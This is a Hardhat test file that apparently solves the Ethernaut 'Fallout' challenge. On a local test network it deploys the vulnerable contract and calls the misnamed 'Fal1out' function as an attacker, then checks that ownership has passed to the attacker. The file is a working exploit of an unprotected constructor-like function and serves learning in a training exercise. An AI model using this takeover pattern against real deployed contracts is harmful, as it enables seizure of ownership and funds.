import { expect } from "chai";
import hre from "hardhat";
import hardhatNetworkHelpers from "@nomicfoundation/hardhat-network-helpers";

const { ethers, networkHelpers } = await hre.network.connect();

describe("Fallout Test", function () {
  it("Fallout block", async () => {
    // setup users
    const [deployer, attacker] = await ethers.getSigners();
    await networkHelpers.setBalance(
      attacker.address,
      ethers.parseEther("1")
    );

    // deploy contract
    const Fallout = await ethers.getContractFactory("Fallout", deployer);
    const fallout = await Fallout.deploy();
    await fallout.waitForDeployment();

    console.log("Owner upon deployment: ",await fallout.owner());

    
    // call Fal1out function
    const falloutAsAttacker = fallout.connect(attacker);
    const tx = await falloutAsAttacker.Fal1out({ value: ethers.parseEther("0.0001") ,});
    await tx.wait();

    console.log("Owner after Fal1out invocation: ",await fallout.owner());

    // verify the attacker is now the owner
    expect(await fallout.owner()).to.equal(attacker.address);
  });
});
